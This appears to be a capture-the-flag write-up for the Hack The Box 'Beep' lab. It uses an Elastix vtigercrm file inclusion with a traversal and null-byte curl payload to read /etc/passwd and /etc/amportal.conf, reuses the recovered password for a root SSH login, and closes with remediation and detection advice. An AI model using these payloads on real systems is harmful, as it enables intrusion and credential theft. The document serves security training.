HACK THE BOX / LINUX / EASY / RETIRED

Beep

Elastix file inclusion → configuration secret → root SSH

Dylan Senez · d4rkgunn3r · Public report

Source and reproduction

Edited from my retained Notion assessment notes. Commands are arranged into a complete sequence; addresses are the original lab values and must match your instance. Output excerpts are recorded evidence, not a new execution or independent retest. Instance flags and recovered secrets are omitted.

01 / Assessment summary

The retained November 30, 2025 assessment documents file inclusion in Elastix’s vtigercrm component, disclosure of /etc/amportal.conf, and SSH access as root using the recovered credential. The notes include whoami returning root and retrieval of /root/root.txt. The path reaches root directly through credential reuse; a separate local escalation exploit is unnecessary.

02 / Reconnaissance

nmap -sV -sC -p- 10.129.229.183 -T4 --min-rate 5000

The original scan records a broad legacy service surface: SSH, mail services, HTTP/HTTPS, MySQL, Asterisk management, and Webmin. HTTPS serves Elastix, and Webmin is identified as MiniServ 1.570. These banners inform prioritization; they are not proof that every listed service is exploitable.

03 / Validate the file inclusion

The vulnerable input is current_language on /vtigercrm/graph.php. The retained notes include both a non-null-terminated traversal capture and a null-byte-terminated reproduction URL. The response can include file contents followed by the application’s restriction message; that suffix does not negate the preceding disclosure.

curl -k 'https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action'

Recorded excerpt:

root:x:0:0:root:/root:/bin/bash
...
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.

The lab uses a self-signed certificate. -k is the original lab command’s certificate-check override.

04 / Read the configuration

Use the same documented file-read primitive for /etc/amportal.conf. This command normalizes the file path substitution explicitly described in the source notes; the exact HTTP response for this particular file was not embedded in those notes.

curl -k 'https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action' \
  -o amportal.conf.disclosed
rg 'AMPDBUSER|AMPDBPASS|AMPMGRUSER|AMPMGRPASS|FOPPASSWORD|ARI_ADMIN' amportal.conf.disclosed

The retained credential inventory records the same recovered secret in AMPDBPASS, AMPMGRPASS, FOPPASSWORD, and ARI_ADMIN_PASSWORD. The public report omits the value; retrieve it from your own instance. Password reuse links the configuration disclosure to the SSH login.

05 / Root access over SSH

The recorded SSH command enables the legacy key-exchange and host-key algorithms needed for this host. Enter the recovered configuration password at the SSH prompt. If your SSH client rejects other legacy settings, use the negotiation error to identify the incompatibility rather than treating it as an incorrect password.

ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
  -oHostKeyAlgorithms=+ssh-rsa root@10.129.229.183
whoami
cat /root/root.txt

Recorded identity output:

root

The original notes include a root proof value, omitted here. They do not include a separate user-proof capture; no additional proof value or path is invented in this version.

06 / Remediation and detection

Remove or patch the vulnerable vtigercrm component and allow-list language identifiers instead of accepting filesystem paths. Restrict access to configuration files, rotate the disclosed secrets, and eliminate credential reuse between applications and operating-system administrators.

Disable root password login over SSH and replace obsolete Elastix, Webmin, and cryptographic settings. Monitor requests containing traversal or null-byte sequences in current_language, followed by new SSH logins as root. These are recommendations, not controls verified during a remediation retest.

07 / Reproduction checklist

Required: a matching Beep instance, Nmap, curl, and an SSH client able to negotiate the recorded legacy algorithms. Confirm file disclosure, recover the configuration secret, use it for the recorded root SSH login, and verify root identity. The route is documented through its root endpoint without a dependency on an unavailable custom exploit script.
